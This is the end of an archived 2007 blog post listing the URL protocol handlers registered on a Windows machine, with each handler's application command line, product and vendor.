+Command-Line      : "D:\Program Files\Picasa2\Picasa2.exe" "%1"
+Product Name      : Picasa
+Company Name      : Google Inc.
+================================================== <br>
+==================================================
+URL Name          : pnm
+Status            : Enabled
+Description       : RealNetworks 流协议
+Command-Line      : D:\Media\Players\RealPlayer\RealPlay.exe "%1"
+Product Name      : RealPlayer (32-bit)
+Company Name      : RealNetworks, Inc.
+================================================== <br>
+==================================================
+URL Name          : ppstream
+Status            : Enabled
+Description       : URL:ppstream Protocol
+Command-Line      : "D:\Networks\PPStream\PPStream.exe" -ppstream %1
+Product Name      :
+Company Name      : PPStream.com
+================================================== <br>
+==================================================
+URL Name          : QSK
+Status            : Enabled
+Description       : QSKProtocol
+Command-Line      : "D:\Chat\Tencent\QQ2007\Timwp.exe" "%1"
+Product Name      : QQOneClickApp 应用程序
+Company Name      :
+================================================== <br>
+==================================================
+URL Name          : RealPlayer.AutoPlay.6
+Status            : Enabled
+Description       : RealPlayer MP3/VCD 自动播放
+Command-Line      : D:\Media\Players\RealPlayer\RealPlay.exe /autoplay
+"%1"
+Product Name      : RealPlayer (32-bit)
+Company Name      : RealNetworks, Inc.
+================================================== <br>
+==================================================
+URL Name          : RealPlayer.CDBurn.6
+Status            : Enabled
+Description       : RealPlayer 空白 CD 自动播放
+Command-Line      : D:\Media\Players\RealPlayer\RealPlay.exe /burn
+"%1"
+Product Name      : RealPlayer (32-bit)
+Company Name      : RealNetworks, Inc.
+================================================== <br>
+==================================================
+URL Name          : rlogin
+Status            : Enabled
+Description       : URL:RLogin Protocol
+Command-Line      : url.dll,TelnetProtocolHandler %l
+Product Name      : RealPlayer (32-bit)
+Company Name      : RealNetworks, Inc.
+================================================== <br>
+==================================================
+URL Name          : rtsp
+Status            : Enabled
+Description       : 实时流协议
+Command-Line      : D:\Media\Players\RealPlayer\RealPlay.exe "%1"
+Product Name      : RealPlayer (32-bit)
+Company Name      : RealNetworks, Inc.
+================================================== <br>
+==================================================
+URL Name          : search-ms
+Status            : Enabled
+Description       : Windows Search Protocol
+Command-Line      : %SystemRoot%\Explorer.exe /separate,/idlist,%I,%L
+Product Name      : Microsoft? Windows? Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : skype
+Status            : Enabled
+Description       : URL:Skype Protocol
+Command-Line      : "D:\Chat\Skype\Skype.exe" "/uri:%l"
+Product Name      : Skype
+Company Name      : Skype Technologies S.A.
+================================================== <br>
+==================================================
+URL Name          : snews
+Status            : Enabled
+Description       : URL:Snews Protocol
+Command-Line      : "%ProgramFiles%\Windows Mail\WinMail.exe" /
+newsurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : synacast
+Status            : Enabled
+Description       : URL:synacast Protocol
+Command-Line      : "D:\Networks\SynaLive\PE.exe" -peer -url "%1"
+Product Name      :
+Company Name      :
+================================================== <br>
+==================================================
+URL Name          : telnet
+Status            : Enabled
+Description       : URL:Telnet Protocol
+Command-Line      : url.dll,TelnetProtocolHandler %l
+Product Name      :
+Company Name      :
+================================================== <br>
+==================================================
+URL Name          : Tencent
+Status            : Enabled
+Description       : Tim Protocol
+Command-Line      : "D:\Chat\Tencent\TM2008\Bin\Timwp.exe" "%1"
+Product Name      : QQ
+Company Name      : TENCENT
+================================================== <br>
+==================================================
+URL Name          : Thunderbird.Url.mailto
+Status            : Enabled
+Description       : Thunderbird URL
+Command-Line      : "D:\Networks\ThunderbirdPortable\App\thunderbird
+\thunderbird.exe" -osint -compose "%1"
+Product Name      : Thunderbird
+Company Name      : Mozilla Corporation
+================================================== <br>
+==================================================
+URL Name          : Thunderbird.Url.news
+Status            : Enabled
+Description       : Thunderbird (News) URL
+Command-Line      : "D:\Networks\ThunderbirdPortable\App\thunderbird
+\thunderbird.exe" -osint -mail "%1"
+Product Name      : Thunderbird
+Company Name      : Mozilla Corporation
+================================================== <br>
+==================================================
+URL Name          : tn3270
+Status            : Enabled
+Description       : URL:TN3270 Protocol
+Command-Line      : url.dll,TelnetProtocolHandler %l
+Product Name      : Thunderbird
+Company Name      : Mozilla Corporation
+================================================== <br>
+==================================================
+URL Name          : TSBuddy
+Status            : Enabled
+Description       : URL:TN3270 Protocol
+Command-Line      : D:\Chat\Tencent\QQ2006\SBuddyCall.exe %1
+Product Name      : Thunderbird
+Company Name      : Mozilla Corporation
+================================================== <br>
+==================================================
+URL Name          : webcal
+Status            : Enabled
+Description       : URL:Webcal Protocol
+Command-Line      : "%ProgramFiles%\Windows Calendar\wincal.exe" /
+webcal "%1"
+Product Name      : Microsoft? Windows? Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : WindowsCalendar.UrlWebcal.1
+Status            : Enabled
+Description       : URL:Webcal Protocol
+Command-Line      : "%ProgramFiles%\Windows Calendar\wincal.exe" /
+webcal "%1"
+Product Name      : Microsoft? Windows? Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : WindowsMail.Url.Mailto
+Status            : Enabled
+Description       : URL:Mail Protocol
+Command-Line      : "%ProgramFiles%\Windows Mail\WinMail.exe" /
+mailurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : WindowsMail.Url.news
+Status            : Enabled
+Description       : URL:News Protocol
+Command-Line      : "%ProgramFiles%\Windows Mail\WinMail.exe" /
+newsurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : WindowsMail.Url.nntp
+Status            : Enabled
+Description       : URL:NNTP Protocol
+Command-Line      : "%ProgramFiles%\Windows Mail\WinMail.exe" /
+newsurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : WindowsMail.Url.snews
+Status            : Enabled
+Description       : URL:Snews Protocol
+Command-Line      : "%ProgramFiles%\Windows Mail\WinMail.exe" /
+newsurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : WLMail.Url.Mailto
+Status            : Enabled
+Description       : URL:Mail Protocol
+Command-Line      : C:\Program Files\Windows Live Mail desktop
+\wlmail.exe /mailurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : WLMail.Url.news
+Status            : Enabled
+Description       : URL:News Protocol
+Command-Line      : C:\Program Files\Windows Live Mail desktop
+\wlmail.exe /newsurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : WLMail.Url.nntp
+Status            : Enabled
+Description       : URL:NNTP Protocol
+Command-Line      : C:\Program Files\Windows Live Mail desktop
+\wlmail.exe /newsurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : WLMail.Url.snews
+Status            : Enabled
+Description       : URL:Snews Protocol
+Command-Line      : C:\Program Files\Windows Live Mail desktop
+\wlmail.exe /newsurl:"%1"
+Product Name      : Microsoft(R) Windows(R) Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : WMP11.AssocProtocol.MMS
+Status            : Enabled
+Description       : URL:mms Protocol
+Command-Line      : "%ProgramFiles%\Windows Media Player\wmplayer.exe"
+"%L"
+Product Name      : Microsoft? Windows? Operating System
+Company Name      : Microsoft Corporation
+================================================== <br>
+==================================================
+URL Name          : WPC
+Status            : Enabled
+Description       : URL:Windows Parental Controls URL Exemption
+Request Protocol
+Command-Line      : %systemroot%\system32\wpcer.exe %1
+Product Name      : Windows
+Company Name      : Microsoft Corporation
+==================================================
+</pre></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-11-21T02:11:10+08:00">2007-11-21</time></p>
 <p>archive</p>            </div>
           </article>
         </div>
